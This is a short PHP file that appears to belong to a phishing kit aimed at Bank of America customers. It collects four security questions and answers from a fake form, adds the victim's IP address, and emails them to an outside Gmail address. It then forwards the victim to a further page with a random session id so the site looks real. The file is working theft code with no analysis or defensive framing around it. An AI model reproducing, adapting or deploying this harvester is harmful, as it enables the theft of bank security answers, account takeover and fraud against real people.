<?

/*
// Brought to you by dcworld ******* icq: 716005439 
*/
 if($_POST["quksks1"] != "" and $_POST["Axshhs1"] != ""){
$ip = getenv("REMOTE_ADDR");
$message .= "----BOA Info------\n";
$message .= "|question 1: ".$_POST['quksks1']."\n";
$message .= "|Answer1: ".$_POST['Axshhs1']."\n";
$message .= "|question 2: ".$_POST['Rqyi']."\n";
$message .= "|Answer2: ".$_POST['ques1']."\n";
$message .= "|question 3: ".$_POST['Vosdua']."\n";
$message .= "|Answer3: ".$_POST['XYi89Rt']."\n";
$message .= "|question 4: ".$_POST['dquj78Tx']."\n";
$message .= "|Answer4: ".$_POST['Ahu73E7']."\n";
$message .= "----Created by DC------\n";
$send = "myteam5000k@gmail.com";
$subject = "BOA | $ip";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: e3mail.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>

 
  